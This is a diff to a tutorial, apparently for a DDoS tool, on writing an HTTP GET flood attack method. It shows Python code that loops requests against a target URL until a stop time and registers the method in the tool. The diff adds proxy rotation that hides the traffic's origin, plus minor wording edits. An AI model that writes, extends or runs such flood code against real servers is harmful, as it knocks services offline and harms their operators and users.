@@ -37,6 +37,7 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 2. After that, we have the imports
 ```py
 import time, requests
+
 from src.core import Core
 from src.utils import *
 from src.useragent import *
@@ -60,7 +61,8 @@ def flood(attack_id, url, stoptime) -> None:
                 timeout=(5,0.1), 
                 allow_redirects=False,
                 stream=False,
-                cert=None
+                cert=None,
+                proxies=utils().get_proxy()
             )
 
             Core.infodict[attack_id]['req_sent'] += 1
@@ -80,7 +82,7 @@ def flood(attack_id, url, stoptime) -> None:
 # add the method to the methods dictionary
 Core.methods.update({
     'GET': { # name, which will be used for the "-m/--method" argument
-        'info': 'HTTP GET flood, with basic customizability', # information about the attack
+        'info': 'HTTP GET flood', # information about the attack
         'func': flood # function
     }
 })
@@ -135,7 +137,7 @@ Core.methods.update({
     - Now, we will start on the request sending
        - It is recommended to use the `Core.session` object, due to it being much faster
        - You can just do `requests.get` or `requests.post`, but it will take a huge hit on the performance
-       - For the sake of the small tutorial, we will just be doing `requests.get`
+       - For the sake of this tutorial, we will just be doing `requests.get`
 
        - start by adding the `requests.get` function, where the url will be the `url` argument passed to the function:
            ```py
@@ -204,7 +206,7 @@ Core.methods.update({
                     pass
         ```
 
-        - Like i said earlier, its not recommended to ignore the error
+        - Like i said earlier, its not recommended to ignore the errors
         ```py
         def attacker(attack_id, url, stoptime):
             while time.time() < stoptime and not Core.killattack:
